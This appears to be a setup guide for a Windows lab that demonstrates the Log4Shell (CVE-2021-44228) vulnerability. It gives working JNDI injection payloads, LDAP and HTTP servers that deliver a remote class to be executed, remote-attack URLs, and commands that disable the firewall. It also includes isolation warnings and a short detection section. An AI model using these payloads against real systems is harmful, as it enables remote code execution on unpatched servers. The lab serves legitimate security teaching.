# Log4Shell Security Lab - Windows Setup Guide

## Lab Overview
A complete Log4Shell (CVE-2021-44228) vulnerability demonstration and detection lab running on Windows.

## Prerequisites
- Windows 10/11
- Java 8 (vulnerable version - OpenJDK 8u181 or similar)
- Python 3.x
- Git
- Admin privileges for hosts file modification

## Quick Setup - 3 Terminal Windows

### Terminal 1: Vulnerable Application
```powershell
cd C:\Log4Shell-Lab\vulnerable-app
java -cp ".;log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true" "-Dcom.sun.jndi.rmi.object.trustURLCodebase=true" "-Dcom.sun.jndi.cosnaming.object.trustURLCodebase=true" SimpleVulnerable
```

### Terminal 2: LDAP Server (marshalsec)
```powershell
cd C:\Log4Shell-Lab\vulnerable-app
# For local testing:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://localhost:8888/#Exploit"

# For remote access (replace YOUR_IP with your external IP):
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://localhost:8888/#Exploit" 1389 0.0.0.0
```

### Terminal 3: HTTP Server
```powershell
cd C:\Log4Shell-Lab\ldap-server
# For local testing:
python -m http.server 8888

# For remote access:
python -m http.server 8888 --bind 0.0.0.0
```

## Remote Access Configuration

### Enable Remote Exploitation
1. **Edit hosts file** (Run Notepad as Administrator):
   - Open: `C:\Windows\System32\drivers\etc\hosts`
   - Add: `127.0.0.1    attacker.local`
   - Save the file

2. **Configure Windows Firewall** (if needed):
   ```powershell
   # Add firewall rules
   netsh advfirewall firewall add rule name="Log4Shell-8080" dir=in action=allow protocol=TCP localport=8080
   netsh advfirewall firewall add rule name="LDAP-1389" dir=in action=allow protocol=TCP localport=1389
   netsh advfirewall firewall add rule name="HTTP-8888" dir=in action=allow protocol=TCP localport=8888

   # Or temporarily disable firewall (testing only!)
   netsh advfirewall set allprofiles state off
   ```

## Exploitation Commands

### Local Testing
```powershell
# Test JNDI processing (should show Java version)
curl -H "User-Agent: test_${java:version}" http://localhost:8080

# Execute exploit (launches calc.exe)
curl -H "User-Agent: ${jndi:ldap://localhost:1389/Exploit}" http://localhost:8080
```

### Remote Attack
From any external machine or browser:
```bash
# Using the hosts file entry (replace YOUR_IP with server's external IP)
http://YOUR_IP:8080/?q=${jndi:ldap://attacker.local:1389/Exploit}

# Direct attack (if hosts file not configured)
http://YOUR_IP:8080/?q=${jndi:ldap://YOUR_IP:1389/Exploit}
```

## Success Indicators

When exploitation succeeds, you will see:

1. **Calculator launches** (calc.exe opens)
2. **Terminal 1** shows JNDI lookup processing
3. **Terminal 2** shows: `Send LDAP reference result for Exploit redirecting to http://localhost:8888/Exploit.class`
4. **Terminal 3** shows: `"GET /Exploit.class HTTP/1.1" 200`

## Lab Files Structure

```
C:\Log4Shell-Lab\
├── vulnerable-app\
│   ├── SimpleVulnerable.java      # Vulnerable application
│   ├── SimpleVulnerable.class     # Compiled application
│   ├── log4j-core-2.14.1.jar     # Vulnerable Log4j
│   ├── log4j-api-2.14.1.jar      # Log4j API
│   └── marshalsec.jar             # LDAP exploit server
├── ldap-server\
│   ├── Exploit.java               # Malicious payload source
│   └── Exploit.class              # Compiled payload (served via HTTP)
```

## Troubleshooting

### Port Already in Use
```powershell
# Find process using port
netstat -ano | findstr :8080
# Kill process (replace PID with actual number)
taskkill /PID <PID> /F
```

### Verify Services
```powershell
# Check if ports are listening
netstat -an | findstr "8080 1389 8888"

# Test connectivity
Test-NetConnection -ComputerName localhost -Port 8080
Test-NetConnection -ComputerName localhost -Port 1389
Test-NetConnection -ComputerName localhost -Port 8888
```

### Reset Lab
```powershell
# Stop all services (Ctrl+C in each terminal)
# Restart terminals in order: 1, 2, 3
```

## Detection Tools

### Quick Detection Check
```powershell
# Search logs for JNDI patterns
Select-String -Pattern "\${jndi:" -Path "*.log"

# Monitor network connections
netstat -an | findstr "1389\|8888"
```

## Security Notes

⚠️ **WARNING**: This lab demonstrates a critical vulnerability (CVSS 10.0)
- Run only in isolated test environments
- Never expose to public internet without proper isolation
- The `-Dcom.sun.jndi.ldap.object.trustURLCodebase=true` flag makes the system vulnerable
- Modern Java versions (8u191+) have this disabled by default

## Clean Shutdown

1. Stop Terminal 1 (Ctrl+C) - Vulnerable app
2. Stop Terminal 2 (Ctrl+C) - LDAP server
3. Stop Terminal 3 (Ctrl+C) - HTTP server
4. Re-enable firewall if disabled:
   ```powershell
   netsh advfirewall set allprofiles state on
   ```

## Quick Reference

| Service | Port | Purpose |
|---------|------|---------|
| Vulnerable App | 8080 | Processes Log4j JNDI lookups |
| LDAP Server | 1389 | Redirects to malicious class |
| HTTP Server | 8888 | Serves Exploit.class payload |

## Attack Flow

1. Attacker sends: `${jndi:ldap://attacker.local:1389/Exploit}`
2. Log4j processes JNDI lookup
3. Connects to LDAP server on port 1389
4. LDAP redirects to HTTP server on port 8888
5. Downloads and executes Exploit.class
6. Calculator launches as proof of exploitation